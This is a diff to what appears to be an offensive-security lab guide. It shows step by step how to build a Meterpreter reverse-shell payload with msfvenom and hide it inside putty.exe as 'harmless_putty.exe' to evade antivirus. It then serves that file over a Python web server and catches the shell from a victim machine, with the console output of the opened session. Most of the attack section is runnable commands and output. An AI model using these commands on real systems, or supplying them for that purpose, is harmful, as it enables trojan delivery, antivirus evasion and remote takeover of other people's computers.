@@ -45,21 +45,34 @@ HTTPort is a tool that bypasses restrictive HTTP proxies. It tunnels blocked tra
 
 **Steps**:
 You generated a basic, easily detectable payload:
-- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe`
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.111.208 LPORT=4444 -f exe -o payload.exe`
 You downloaded putty.exe to use as a legitimate template:
 - `wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O template.exe`
 You injected your payload into that template to create a more evasive executable:
-- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x template.exe -k -f exe -o harmless_putty.exe`
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.111.208 LPORT=4444 -x template.exe -k -f exe -o harmless_putty.exe`
 **Result**: Your final payload is saved as harmless_putty.exe.
 
 Start the Listener on Your Kali Machine
 - `msfconsole -q`
 - `use multi/handler`
 - `set payload windows/meterpreter/reverse_tcp`
-- `set LHOST 192.168.1.100`
+- `set LHOST 172.16.111.208`
 - `set LPORT 4444`
 - `exploit -j`
 
+Open a new terminal and start a web server to host your harmless_putty.exe file so the victim can download it.
+- `cd ~`
+- `python3 -m http.server 80`
+
+- Download on Victim Machine: On the victim machine (172.16.111.207), open a web browser and go to: http://172.16.111.208    
+- Download the harmless_putty.exe file.    
+- Execute the Payload: On the victim machine, run the harmless_putty.exe
+- Catch the Shell: As soon as the payload is executed, you will see a message in your Metasploit console:
+
+      [*] Sending stage (175774 bytes) to 172.16.111.207
+      [*] Meterpreter session 1 opened (172.16.111.208:4444 -> 172.16.111.207:[PORT])
+- Interact with the Session: Type the following command at the Metasploit prompt to interact with the victim: `sessions -i 1`
+- You are all set! Your listener is active. Just transfer and run the payload on the victim machine to get your Meterpreter session.
 
 #### 2.3 Bypass antivirus using metasploit templates
 Attackers use msfvenom with the -x flag to embed a malicious payload into a legitimate, trusted executable file (like calc.exe). This tricks antivirus software into seeing the file as safe because it recognizes the trusted program's signature, allowing the hidden payload to bypass detection.
